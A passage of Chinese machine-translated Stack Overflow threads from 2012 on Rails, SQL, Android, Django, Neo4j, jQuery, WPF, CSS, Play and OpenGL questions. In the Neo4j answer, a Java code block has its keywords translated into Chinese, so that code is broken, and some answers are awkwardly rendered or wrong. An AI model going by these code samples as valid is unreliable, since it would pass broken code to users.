In [1]: a = np.arange(12.0).reshape((4,3))

In [2]: b = np.arange(24.0).reshape((8,3))

In [3]: c = np.array([])

In [4]: np.concatenate([x for x in [a,b,c] if x.size > 0])
Out[4]: 
array([[  0.,   1.,   2.],
       [  3.,   4.,   5.],
       [  6.,   7.,   8.],
       [  9.,  10.,  11.],
       [  0.,   1.,   2.],
       [  3.,   4.,   5.],
       [  6.,   7.,   8.],
       [  9.,  10.,  11.],
       [ 12.,  13.,  14.],
       [ 15.,  16.,  17.],
       [ 18.,  19.,  20.],
       [ 21.,  22.,  23.]]) 
```

# ruby-on-rails - 通过 rake test 重置测试数据库抱怨：“数据库配置未指定适配器”

> ID：11782183
> 
> 赞同：1
> 
> 时间：2012-08-02T16:50:55.383
> 
> 标签：ruby-on-rails, postgresql, rake

我正在尝试使用这个[问题](https://stackoverflow.com/questions/1090176/how-do-i-force-rails-env-in-a-rake-task)中的一些有用代码：

```
namespace :db do 
  namespace :test do 
    task :reset do 
      ActiveRecord::Base.establish_connection('test')
      Rake::Task['db:drop'].invoke
      Rake::Task['db:create'].invoke
      Rake::Task['db:migrate'].invoke
      ActiveRecord::Base.establish_connection(ENV['RAILS_ENV'])  #Make sure you don't have side-effects!
    end
  end
end 
```

不幸的是，我收到了这个错误：

```
** Invoke db:test:reset (first_time)
** Execute db:test:reset
rake aborted!
database configuration does not specify adapter
/home/nick/.rvm/gems/ruby-1.9.3-p194/gems/activerecord-   3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:45:in `resolve_hash_connection'
/home/nick/.rvm/gems/ruby-1.9.3-p194/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:39:in `resolve_string_connection'
/home/nick/.rvm/gems/ruby-1.9.3-p194/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:25:in `spec'
/home/nick/.rvm/gems/ruby-1.9.3-p194/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:127:in `establish_connection'
/home/nick/Projects/yumbin/lib/tasks/test_environment.rake:4:in `block (3 levels) in <top (required)>'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `call'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `block in execute'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `each'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `execute'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:158:in `block in invoke_with_call_chain'
/home/nick/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/monitor.rb:211:in `mon_synchronize'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:151:in `invoke_with_call_chain'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/task.rb:144:in `invoke'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:116:in `invoke_task'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:94:in `block (2 levels) in top_level'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:94:in `each'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:94:in `block in top_level'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:133:in `standard_exception_handling'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:88:in `top_level'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:66:in `block in run'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:133:in `standard_exception_handling'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/application.rb:63:in `run'
/home/nick/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/bin/rake:33:in `<top (required)>'
./bundler_stubs/rake:16:in `load'
./bundler_stubs/rake:16:in `<main>'
Tasks: TOP => db:test:reset 
```

如您所见，我通过 RVM 使用 Ruby 1.9.3。我正在使用 Rails 3.2.5、Rake 版本 0.9.2.2 和 Postgresql 9.1，以及 pg gem (0.13.2)。此外，我的环境中没有数据库错误。该应用程序在 Heroku 上部署和运行，在本地开发中运行，我可以毫无问题地运行我的完整测试套件。在运行该行的 Rails 控制台中：

```
ActiveRecord::Base.establish_connection('test') 
```

成功。我在 vi 中检查了 database.yml 中的不可见字符，但找不到任何字符。每行末尾只有“$”。我开始认为答案非常简单并且就在我的鼻子面前，但我就是看不到它。

更新：添加我的 database.yml 文件：

```
# SQLite version 3.x
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem 'sqlite3'
development:
  adapter: postgresql
  encoding: unicode
  database: myapp-dev
  pool: 5
  username: ******
  password: *******

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  adapter: postgresql
  encoding: unicode
  database: myapp-test
  pool: 5
  username: *****
  password: ******

production:
  adapter: postgresql
  encoding: unicode
  database: myapp
  pool: 5
  username: ******
  password: ******* 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T16:56:28.400

您的文件中需要一个`test`条目`database.yml`，我认为您可能缺少一个条目。确保您有一个如下所示的条目`database.yml`：

```
test:
  adapter: sqlite3
  database: db/test.sqlite3
  pool: 5
  timeout: 5000 
```

使用您的开发数据库正在使用的任何适配器和数据库。

# sql - 如何在此查询中正确使用 LEFT JOIN IS NULL 或 NOT EXISTS？

> ID：11782188
> 
> 赞同：1
> 
> 时间：2012-08-02T16:51:36.000
> 
> 标签：sql, database, join, left-join

经过几十次尝试，我仍然得到错误的结果，所以我想我最好寻求帮助。

表：

```
labels
    id, user_id, name

messages_labels
    id, message_id, label_id 
```

`labels.id`指`message_labels.label_id`

给定消息 ID 和用户 ID，如何获得正确的结果未使用标签？未使用的标签是指对于给定的消息 ID 没有条目的`message_labels`标签，基本上只选择要添加到该消息中的尚未用于该消息的标签。

这意味着类似...

```
SELECT l.id, l.name
FROM labels l
INNER/LEFT JOIN messages_labels ml ON (l.id=ml.label_id)
WHERE... user_id=:user_id ...

... and `message_id <> :message_id` 
```

??

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:02:23.600

这应该有效：`LEFT JOIN`在 label_id 和消息 id 上，任何没有 ML 记录的都是你想要的

```
SELECT 
    l.id, l.name
FROM labels l
LEFT JOIN message_labels ml
    ON l.id = ml.label_id
    AND message_id = :message_id
WHERE l.user_id = :user_id
AND ml.id IS NULL 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T16:55:25.463

一种方法：

```
SELECT labels.*, count(messages_labels.id) AS mlid
FROM labels
JOIN messages_labels ON labels.id = messages_labels.label_id
WHERE (user_id = :user_id) AND (message_id = :message_id)
GROUP BY labels.id
HAVING (mlid = 0) 
```

如果我正确地阅读了您的问题。

# android - ActionBar 选项卡 - 用详细信息片段替换列表片段

> ID：11782194
> 
> 赞同：2
> 
> 时间：2012-08-02T16:51:53.310
> 
> 标签：android, android-fragments, android-actionbar, actionbarsherlock

我正在努力结合**标签式 ActionBar**和**Fragments**。

我正在使用**ActionBarSherlock**显示三个独立的选项卡，而我的问题仅与第一个选项卡有关。它应该以列表和详细视图的组合显示项目（称为“优惠券”）。其他两个选项卡显示不同的内容，在这里不发挥作用。

我正在做的是以下内容：

*   主要活动为三个选项卡创建三个片段
*   选项卡 A（列表片段）填充并呈现其列表
*   对于列表上的点击，我在主要活动中编写了一个回调，该回调接收点击项目的 id 并将列表片段与选项卡上的详细信息片段交换（至少它应该这样做）
*   在该回调中，我创建了要显示的详细信息片段并尝试用它替换列表片段。

不幸的是，我没有超越：

> java.lang.IllegalArgumentException：没有为片段 CouponDetailFragment{44f4e310 #1 id=0x7f040027} 找到 id 0x7f040027 的视图

我在问题的末尾附上了相关的片段。非常感谢任何帮助。

这些是相关的片段：

```
public class MyCouponActivity extends SherlockFragmentActivity implements CouponListFragment.Callbacks 
```

列表片段：

> ```
> <fragment xmlns:android="http://schemas.android.com/apk/res/android"
>     xmlns:tools="http://schemas.android.com/tools"
>     android:name="foo.bar.CouponListFragment"
>     android:id="@+id/coupon_list"
>     android:layout_width="match_parent"
>     android:layout_height="match_parent" /> 
> ```

分片交换交易：

```
@Override
public void onItemSelected(final String id) {
    final Bundle arguments = new Bundle();
    arguments.putString(CouponDetailFragment.ARG_ITEM_ID, id);
    final CouponDetailFragment fragment = new CouponDetailFragment();
    fragment.setArguments(arguments);
    getSupportFragmentManager().beginTransaction().replace(R.id.coupon_list, fragment).commit();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:02:46.293

如果您在 XML 中定义一个片段，它是固定的，并且您不能用 FragmentTransaction 中的另一个片段替换它。

你最好的选择是`<fragment />`用某种`ViewGroup`. 不要忘记，您必须使用 FragmentTransaction 在`onCreate(..)`Activity 中添加 CouponListFragment。

# django - 带有继承模型的 Django UpdateView

> ID：11782195
> 
> 赞同：1
> 
> 时间：2012-08-02T16:51:59.883
> 
> 标签：django, inheritance, django-generic-views

我正在尝试将 Django 的通用 UpdateViews 与 ModelForms 一起使用，但是我使用的模型是继承模型。

如果我在模型和表单绑定到“BaseModel”时扩展 UpdateView 类，一切正常。对于不存在并且可以成功查看和保存数据的实例，我得到 404。

如果我在模型和表单绑定到“InheritedModel”时扩展 UpdateView 类，则页面将加载但没有数据通过，并且当我尝试访问不存在的实例的 URL 时，页面仍会加载相同的。

模型.py

```
class Account(models.Model):

    account_name = models.CharField(max_length=255)

class CheckingAccount(Account):

    overdraft = models.IntegerField() 
```

网址.py

```
url(r'^account/(?P<pk>\d+)/edit/$', CheckingAccountUpdateView.as_view(), name='account-checking-edit'), 
```

表格.py

```
class CheckingAccountForm(ModelForm): 

    class Meta: 
        model = CheckingAccount 
```

视图.py

```
class CheckingAccountUpdateView(UpdateView): 

    model = CheckingAccount
    form_class = CheckingAccountForm 
    template_name = 'account/checking_edit.html'
    success_url = '.' 
```

UpdateView 等通用类视图是否支持继承模型？我错过了什么吗？如果不是，那么为继承模型提供表单的最佳方式是什么？

# indexing - neo4j 在 200K 节点和 450K 关系上计算节点性能

> ID：11782197
> 
> 赞同：1
> 
> 时间：2012-08-02T16:52:10.033
> 
> 标签：neo4j, php, indexing, neo4j, gremlin, cypher

我们正在开发一个基于[neo4j](/questions/tagged/neo4j "显示标记为“neo4j”的问题")和[php](/questions/tagged/php "显示标记为“php”的问题")的应用程序，大约有**200k**个节点，每个节点都有一个属性，例如`type='user'`或 `type='company'` 表示我们应用程序的特定实体。我们需要获取图中特定类型的所有节点的计数。

我们为每个实体创建了一个索引，例如`users`，`companies`它包含该属性的节点。所以内部`users`索引驻留**130K**节点，其余在`companies`.

使用 Cypher，我们可以像这样查询。

```
START u=node:users('id:*')
RETURN count(u) 
```

结果是

```
Returned 1 row.Query took 4080ms 
```

服务器配置为默认值，稍作调整，但 4 秒也满足我们的需要。认为数据库会在 1 个月内增长 20K，所以我们非常非常需要这个查询执行。

有没有其他方法可以做到这一点，也许使用 Gremlin，或者使用其他服务器插件？我会缓存这些结果，但我想知道是否可以调整它。

非常感谢，对不起我糟糕的英语。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-24T03:41:48.807

最后，使用 Gremlin 而不是 Cypher，我找到了解决方案。

```
g.getRawGraph().index().forNodes('NAME_OF_USERS_INDEX').query(
    new org.neo4j.index.lucene.QueryContext('*')
).size() 
```

此方法使用 lucene 索引来获取“近似”行。

再次感谢大家。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:27:56.133

嗯，这真的是关于那个 Lucene 索引的性能。如果您大部分时间只需要这个单一查询，为什么不使用某个节点上某个节点上的总数更新一个整数，并且可能与索引插入一起更新它，为了更好的措施，每晚使用上面的查询运行更新就可以了?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T18:40:47.990

相反，您可以使用此类节点的数量使特定节点上的属性保持最新，其中更新由写锁保护：

```
交易 tx = db.beginTx();
尝试 {
    ...
    ...
    tx.acquireWriteLock(countingNode);
    countNode.setProperty("user_count",
        ((整数)countingNode.getProperty("user_count"))+1);
    tx.成功（）；
} 最后 {
    tx.finish();
}

```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-03T10:32:37.030

如果您想要最佳性能，请不要将您的实体类别建模为节点上的属性。相反，这样做：

company1-[:IS_ENTITY]->公司实体

或者，如果您使用的是 2.0

公司1：公司

顺便说一下，第二个还允许您在单独的后台线程中自动更新索引，这是 imo 2.0 的最佳新功能之一

第一种方法也应该证明更有效，因为通常进行“跳跃”比从节点读取属性花费的时间更少。但是，它确实需要您为实体创建单独的索引。

您的查询将如下所示：

**v2.0**

```
MATCH company:COMPANY
RETURN count(company) 
```

**v1.9**

```
START entity=node:entityindex(value='company')
MATCH company-[:IS_ENTITIY]->entity
RETURN count(company) 
```

# jquery - jQuery 多个 div 显示一次只隐藏一个

> ID：11782201
> 
> 赞同：2
> 
> 时间：2012-08-02T16:52:26.423
> 
> 标签：jquery, html, hide, show, overlapping

您好，让我先解释一下，我根本没有使用 jQuery。简单的显示和隐藏以及基本的 UI 是程度。话虽如此，我试图能够显示一个 div，这实际上是一个链接到“链接”的“页面”。

标记：

```
<body>
<!--Footer and Navigation Div's-->
<div id="bg"><img src="images/bg.jpg" alt=""></div>
    <div id="footer">
        <p>S.E. <span>yoga</span></p>
            <div id="nav">
                <ul><a href="#">Link 1</a></ul>
                <ul><a href="#">Link 2</a></ul>
                <ul><a href="#">Link 3</a></ul>
                <ul><a href="#">Link 4</a></ul>
            </div>
    </div>
<!--END Footer and Navigation Div's-->

<div class="parent">
<div class="a">
        <p>this is a</p>
    </div>   
   <div class="b">
        <p>this is b</p>
    </div>
    <div class="c">
        <p>this is c</p>
    </div>
    <div class="d">
        <p>this is d</p>
    </div>
</body>
</html> 
```

jQuery：

```
 /*
 $(document).ready(function(){
 $('#nav').click(function(){
        $(".a").slideToggle();
  var divname= this.value;
          $("#"+divname).show("slow").siblings().hide("slow");

    });
});*/ 

    $(document).ready(function(){
    $('.a, .b, .c, .d').hide();
});; 
```

因此，我使用的第一个脚本（已注释掉）将用作起点。第二个脚本，它们都被隐藏了，这就是我要去的地方。将它们全部隐藏，然后一次只显示一个。

div 是重叠的。有什么帮助吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:45:34.763

你可以用这个

```
 $(document).ready(function(){
         $('.parent  div').hide(); // hide div's on load using parent class as a starting point     
         $('#nav a').click(function() {  // on the anchor clicks that are inside div with id=nav
            var $div = $('.parent div').eq($(this).index('#nav a'));  // get the relevant div
            $div.show();  // show the relevant div
            $('.parent div').not($div).hide();  // hide all but the relevant div
        });​
    }): 
```

编辑：

`$('.parent div')` // <-- 获取父类元素下的所有 div

[.eq(index)](http://api.jquery.com/eq/) // 将获取给定索引处的元素，如下所示

`$(this)`// <-- 当前点击的锚标签

`.index('#nav a');` // <-- 获取当前锚标签与其他锚标签相比的[index()](http://api.jquery.com/index/)

奇怪的是我通常使用 $(this).index() 并且它可以工作，但这次它没有，所以我不得不在索引中指定一个选择器。

还修复您的 html 使其看起来像这样

```
 <div id="nav">
    <ul>
        <li><a href="#">Link 1</a></li>
        <li><a href="#">Link 2</a></li>
        <li><a href="#">Link 3</a></li>
        <li><a href="#">Link 4</a></li>
    </ul>
</div> 
```

更新的小提琴

[http://jsfiddle.net/HpCWW/1/](http://jsfiddle.net/HpCWW/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:27:29.197

如果您想一次只显示一个 div，请考虑使用 jquery 手风琴。[http://jqueryui.com/demos/accordion/](http://jqueryui.com/demos/accordion/)

# algorithm - 简单图 |V|= 10^6，4 级：最大独立子集？

> ID：11782203
> 
> 赞同：2
> 
> 时间：2012-08-02T16:52:29.863
> 
> 标签：algorithm, math, graph

给你一个简单的最大度数为 4 的图，有 100 万个顶点。

我们想找到一个最大独立子集。

在一般情况下，它是 NP 难的。

度数最大为 4 的事实是否提供了计算它的有效解决方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:09:19.633

进一步阅读该维基百科页面，我发现了这个主题：

> 例如，对于稀疏图（边数最多是任何子图中顶点数的常数倍的图），最大团具有有界大小，并且可以精确地在线性时间内找到；^([6])然而，对于相同类别的图，甚至对于更受限制的有界度图类别，找到最大独立集是 MAXSNP 完全的，这意味着对于某些常数 c（取决于度）它是 NP - 很难找到一个近似解，它在最优值的 c 倍范围内。^([7])

你的案例是有界度案例，所以从这个片段来看，你的限制性更强的版本仍然是 NP-hard。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T17:16:15.557

有一个非常简单的贪心 1/5 近似值。取任何顶点，将其添加到独立集，并从图中删除邻居。继续直到没有顶点。这个技巧的一个更一般的版本是[图兰定理](http://en.wikipedia.org/wiki/Method_of_conditional_probabilities#Example_using_pessimistic_estimators)。

# c# - 转换器应该抛出任何异常吗？

> ID：11782205
> 
> 赞同：6
> 
> 时间：2012-08-02T16:52:44.083
> 
> 标签：c#, wpf

今天我遇到了一个错误，应用程序开始抛出多个异常（多个消息框）。应用程序使用 DispatcherUnhandledException。

在调查时，我发现如果转换器的参数为 NULL，则用于格式化 dataGrid 中的日期和时间的转换器会抛出 FormatException。

在任何情况下都建议从转换器抛出异常吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T16:58:05.363

[根据 MSDN](http://msdn.microsoft.com/en-us/library/system.windows.data.ivalueconverter.convert.aspx)，没有：

> 数据绑定引擎不会捕获用户提供的转换器引发的异常。Convert 方法引发的任何异常，或 Convert 方法调用的方法引发的任何未捕获的异常都被视为运行时错误。通过返回 DependencyProperty.UnsetValue 来处理预期的问题。

话虽如此，我个人`NotSupportedException`在`Convert`or`ConvertBack`方法不受支持时使用。

# c# - 对象不可点击

> ID：11782206
> 
> 赞同：0
> 
> 时间：2012-08-02T16:52:49.963
> 
> 标签：c#, wpf, xaml

我正在使用装饰器在画布上画线，但我面临的问题是它不可点击，所以我必须继续点击十次才能使用鼠标选择它。我在这里错过了任何属性设置吗？

谢谢。阿米特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T20:42:49.027

如果您使用像素（默认 hittest）来确定用户是否单击了一条线，则用户必须准确地单击该线。当一条线很细时，这很难。

另一种处理方法是通过计算。当用户单击时，[计算鼠标位置与线之间的距离并选择最近的线。](https://stackoverflow.com/questions/849211/shortest-distance-between-a-point-and-a-line-segment)

您甚至可以创建一个指定半径内的行的有序列表，并在用户再次单击时从该列表中选择下一行。

# css - 保证金错误...我不明白出了什么问题

> ID：11782208
> 
> 赞同：0
> 
> 时间：2012-08-02T16:52:56.290
> 
> 标签：css, firefox, google-chrome

在某些浏览器中应用 css 代码的样式时发生了一些奇怪的事情......

请看一下示例... [http://jsfiddle.net/3FepW/3/](http://jsfiddle.net/3FepW/3/)

在 Chrome 中，绿色 div 比在 Firefox 中更大，我真的不知道是什么问题，我认为在 Firefox 中它应该显示，但在 Chrome 和 IE9 中显示不同。我尝试了很多更改，几天都无法解决这个问题..，我可以使用**height: 100% 或 overflow hidden 但我不能使用其中一个，因为：overflow hidden 隐藏里面的所有内容，但我有一些可拖动/可排序元素和高度：100%，因为我有一个可调整大小的函数，可以放大黄色 div...**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:04:09.867

问题来自称为边距折叠的东西。Chrome 和 IE 正在正确呈现它。不确定 Firefox 在做什么。

这里有很多关于同一个问题的问题。我在这里回答了其中一个问题 -[在 HTML5 网页中添加 CSS 边框更改定位](https://stackoverflow.com/questions/11661264/adding-css-border-changes-positioning-in-html5-webpage/11661286#11661286)

基本上是兄弟姐妹之间的顶部和底部边距，孩子和父母折叠到他们中的最高点。`float: left`你穿上的可以`.c1`防止这种情况发生。`margin-bottom`on卡`.c3`在里面`.c1`，这就是它变大的原因（即，“这就是`.c1`变大的原因”）。

尝试添加`overflow: auto;`-`.c2`另一种防止边距折叠的方法 - 所以`c1`' 边距被“卡住” `.c2`- 我假设这可能是你正在寻找的。

**这是一个小提琴-> [http://jsfiddle.net/joplomacedo/3FepW/5/](http://jsfiddle.net/joplomacedo/3FepW/5/)。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:04:39.160

删除`margin-bottom: 10px;`from `.c3`- 这就是导致这种行为的原因。据我所知，此类问题通常被称为“可折叠边距”，如果我错了，请有人纠正我。

# cocos2d-iphone - 手绘表面使用什么碰撞检测方法？

> ID：11782211
> 
> 赞同：2
> 
> 时间：2012-08-02T16:53:14.230
> 
> 标签：cocos2d-iphone, game-physics

我有一个月球着陆器类型的游戏。我不使用任何物理引擎。如果您不使用推进器，我的着陆器会不断下降并最终降落在地面上。地面是手绘的，它不是一条线，更像曲线，土地可以是任何形状或颜色。如何正确使用碰撞检测及其结果？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T16:56:17.800

那么这取决于你想做什么。我会推荐以下之一：

1.  使用物理引擎。他们在那里是为了某事。您可以创建绘制的不同形状。如果有直线，你可以混合成一个矩形，或者曲线有很多圆，等等。

2.  使用您自己的自定义圆形碰撞检测器。您用边界框大小的圆圈表示着陆器。然后，对于每条手绘线，创建一组表示该线的相邻圆圈。当您检查着陆器位置时，您基本上只是在循环代表线条的圆圈并检查碰撞。传入的伪代码

    ```
    for (CollisionCircle* circle in collisions)
    {
        if (circle.collidesWith(lander.collisionCircle))
        {
            // 1\. Calculate edge distance from lander to circle (position + radius distance)
            // 2\. Remove distance from lander position to fix position.
        }
    } 
    ```

# java - 玩！框架 - 无法连接到数据库

> ID：11782212
> 
> 赞同：3
> 
> 时间：2012-08-02T16:53:25.307
> 
> 标签：java, database, postgresql, ubuntu, playframework-2.0

这是我尝试连接到本地 postgresql 数据库时遇到的错误：

> 无法连接到数据库 [默认]

这是数据库配置。**我确信没有错字（胖手指错误）**：

```
db.default.url="postgres://localhost:5432/myproject/"
db.default.user="postgres"
db.default.pass="mypassword"
db.default.driver="org.postgresql.Driver"
db.default.initSQL="SELECT 1" 
```

哪里有问题？**使用 pgAdmin 我可以轻松连接**
ps
我正在使用 ubuntu。我注意到为了更改为 postgres 用户
**，我必须使用 "su"**，否则更改当前用户失败。
是不是跟玩有关系！无法连接我的数据库？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T07:49:50.600

在您的设置中可能有**两**件事是错误的或至少是可疑的。

首先：`postgres:...`URL 语法不是纯 JDBC URL。PostgreSQL JDBC 驱动程序不理解这种格式。请参阅[此](https://stackoverflow.com/a/10284328/947357)类似问题的答案。

第二：您正在尝试使用 PostgreSQL 超级用户帐户进行 Play。超级用户帐户**只能**用于管理工作，而不是“正常”工作。*尤其*不适用于包括通过某些 Web 前端对数据库进行公共访问的工作。任何 SQL 注入攻击都会为攻击者提供您数据库的金钥匙 - 包括立即破坏您的完整数据库集群或在您的数据库服务器中安装任何后门的核弹。

因此，我建议您创建一个在 Play 中配置的新用户！设置。

也就是说：Ubuntu 上*未*`postgres`设置用户的默认密码。此设置仅允许从同一*操作系统用户*登录到*DB*用户。[此答案](https://stackoverflow.com/a/7696398/947357)中解释了如何解决此问题。

 ****如果这两个提示没有帮助：*您引用的错误非常模糊。某处*必须*有更详细的错误*日志*。请找到它们并使用“编辑”按钮将它们附加到您的问题中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-08-12T01:52:45.580

这不是您问题的直接答案，但我收到了相同的错误消息并通过 Google 来到这里。使用 Scala Play 2.3，我有

```
db.default.driver=org.postgresql.Driver
db.default.url="jdbc:postgresql://127.0.0.1:5432/noob_development"
db.default.logStatements=true 
```

这需要是

```
db.default.driver="org.postgresql.Driver"
db.default.url="jdbc:postgresql://127.0.0.1:5432/noob_development"
db.default.logStatements=true 
```

我不小心把司机名字的引号去掉了。现在它完美地工作了。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-05-28T11:31:37.987

这是我的conf，它有效：

```
db.default.url="jdbc:postgresql://127.0.0.1:5432/dbname"
db.default.driver="org.postgresql.Driver" 
```

只需`jdbc:`在. `postgresql`_`db.default.url`***

# jquery - 选择元素标记和 jquery - 脚本停止工作

> ID：11782215
> 
> 赞同：0
> 
> 时间：2012-08-02T16:53:30.940
> 
> 标签：jquery, html

我有这个选择标签：

```
<div class="browse_by">
     <select id="dynamic_select">  
            <option selected="selected">Browse by Category</option>
    </select>
</div> 
```

jQuery代码：

```
$('#dynamic_select').bind('change', function() {
    var url = $(this).val();
    if (url) {
        window.location = "/gallery/" + url;
    }
    return false;
}); 
```

问题是当我为此 Select 元素使用自定义 jQuery 下拉菜单时，jQuery 代码停止工作。我尝试了 jqtransform 和 dropkick。

在 jqtransform 和 dropkick 之前使用它通常工作正常，但在它们之后它停止工作，没有 url 重定向。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:15:50.397

因此，您使用的是 Dropkick.js，它基本上将您的`select`标签重写为自定义小部件。您需要重新附加事件处理程序。

如果您访问[Dropkick 站点](http://jamielottering.github.com/DropKick/)，请阅读**自定义“更改”回调**部分。

你需要做类似的事情

```
$('#dynamic_select').dropkick({
  change: function (value, label) {
    var url = value;
    if (url) {
       window.location = "/gallery/" + url;
    }
  }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:10:26.510

只是一个问题....您的选项元素没有 VALUE 属性...

`<option selected="selected">Browse by Category</option>`

由于没有`value`定义属性

`var url = $(this).val();` 将失败...

因此，您`window.location`将设置为`"/gallery/undefined"`

让它像

`<option selected="selected" value="somePage.html">Browse by Category</option>`

它会正常工作:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T17:40:11.610

您可以尝试使用我的库[http://www.pkoretic.net/csTransPie/](http://www.pkoretic.net/csTransPie/) 它不会更改选择标签，只会对其应用样式。它甚至可以在手机上本地运行。

# jquery - 处理 jQuery 可选择和 dblclick

> ID：11782216
> 
> 赞同：0
> 
> 时间：2012-08-02T16:53:38.343
> 
> 标签：jquery, jquery-ui, jquery-ui-selectable

我目前设置了一个 jquery 可选列表，并希望能够为单个项目提供下拉菜单以获取更多信息。下拉列表将出现在列表项的 dblclick 上。我遇到的问题是，如果您从一开始就 dblclick 项目，它在技术上是未选中的，但会显示下拉菜单。我想禁用它，这样 dblclick 只有在选择时才能实现。这是我的代码

```
<style>
#selectable { padding: 24px 12px;} 

#selectable li {margin: 0; padding: 12px 6px; border: 1px solid #66CCFF;}

#selectable .ui-selecting {background: #FFCC66;}

#selectable .ui-selected {background: #FF9933;}

#hiding {margin: 0; background: #FFCC66; display:none;}
</style>

<body>
<ul id="selectable">
<li>Item1</li>
<ul>
<li id="hiding">Soda</li>
</ul>
<li>Item2</li>
<li>Item3</li>
</ul>
</body>

<script>
$("#selectable").bind("mousedown", function(e){
    e.metaKey = true;
}).selectable();

$("#selectable").dblclick(function() {
    $("#hiding").slideToggle();
});
</script> 
```

也可以在这里访问[http://jsfiddle.net/someyoungideas/BXjaS/3/](http://jsfiddle.net/someyoungideas/BXjaS/3/)

谢谢

# opengl-es - 只旋转部分顶点？

> ID：11782217
> 
> 赞同：1
> 
> 时间：2012-08-02T16:53:39.320
> 
> 标签：opengl-es, rotation, opengl-es-2.0

我正在向我的 2D 游戏引擎添加一个 OpenGL 渲染器，我想知道是否有一种方法可以将 mvp 矩阵仅应用于单个绘图调用中的部分顶点？

我计划按纹理对绘制调用进行分组，因此我将传递许多顶点和 texcoords 的缓冲区，现在我想将不同的旋转角度应用于不同的四边形。有没有办法在着色器中完成它，或者我应该放弃着色器中的 mvp 矩阵并使用 cpu 执行同样的事情？

**编辑：**如何为每个顶点添加 3 个浮点属性（旋转和 rot_center.xy）？

什么是更好的表现

(1)做CPU轮换？

(2) 每个顶点再提供 3 个浮点数

(3) 分离绘图调用？

还有其他选择吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T16:08:15.730

Use two different objects, that is all!

There is no other workaround for rotation of part of object

Example:

A game with a tank, where you want to rotate turret and remaining-body separately. Like in your case here these two are treated as separate objects.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T07:05:47.260

我认为，虽然出于许多不同的性能原因将绘制调用分组是一件好事，但更改代码以满足基本要求作为旋转并不是一个好主意。

绘图批处理是一件好事，但是，如果您被迫保留一个附加属性（因为您肯定不能使用制服来完成，您将不会拥有单个实体的信息），那么这是不值得的。

一个额外的属性意味着更多的内存带宽使用，这通常是当今系统性能的主要扼杀因素。

另一方面，绘图批处理很重要，但并不总是很关键，它取决于许多因素，例如：

1.  GPU OpenGL驱动优化
2.  GPU 瓦片配置
3.  我们正在讨论的形状/绘制调用的数量（如果屏幕上有 20 个四边形，为什么还要麻烦批处理？:)）

换句话说，通常更方便的是放弃极端批处理以支持易用性/主要可维护性，并避免针对简单需求（如轮换）的花哨解决方案。

我希望这在某种程度上有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-03T02:15:53.913

这是一种可能性：

